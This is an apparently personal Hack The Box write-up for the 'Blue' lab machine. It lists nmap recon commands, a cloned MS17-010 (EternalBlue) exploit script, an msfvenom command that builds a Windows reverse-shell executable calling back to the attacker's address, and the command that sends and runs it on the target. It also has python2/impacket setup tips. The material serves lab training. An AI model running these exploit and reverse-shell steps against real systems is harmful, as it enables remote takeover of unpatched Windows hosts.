# Blue Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA blue 10.10.10.40``

### and

``nmap --script vuln 10.10.10.40``

# ${{\color{purple}Initial Foothold}}\ $

![image](https://user-images.githubusercontent.com/123066149/219156029-61007f6c-1d63-4c56-80c3-b0b229a7d281.png)

# ${{\color{purple}Exploitation}}\ $

### I used this script to run ms-17-010 :
### The most important thing here is not the exploitation but to make a python2 script work with impacket

https://github.com/k4u5h41/MS17-010_CVE-2017-0143

``git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143``

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 -f exe -o ms17-010.exe``

### Change the username to make it work in the exploit 

![image](https://user-images.githubusercontent.com/123066149/219158101-530f4d9d-5ed4-409d-bed3-a0a82bc165cf.png)

``python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe``

![image](https://user-images.githubusercontent.com/123066149/219158641-ace89ab3-225a-4e79-ba19-8d81347e8ca5.png)

![image](https://user-images.githubusercontent.com/123066149/219158807-4134bd30-2ed5-4c02-87f4-583882b6c2e3.png)

# ${{\color{purple}Privilege Escalation}}\ $

### No priv esc because the service runs with system rights

# ${{\color{purple}Point of Improvement}}\ $

* If I have problems with a python 2.7 script and impacket I have to do this :

``sudo python2.7 get-pip.py``

``pip2.7 install --upgrade setuptools``

``python2.7 -m pip install impacket``

![image](https://user-images.githubusercontent.com/123066149/219160110-72dbd5b9-e8ee-4af8-8199-40a5f749e80d.png)

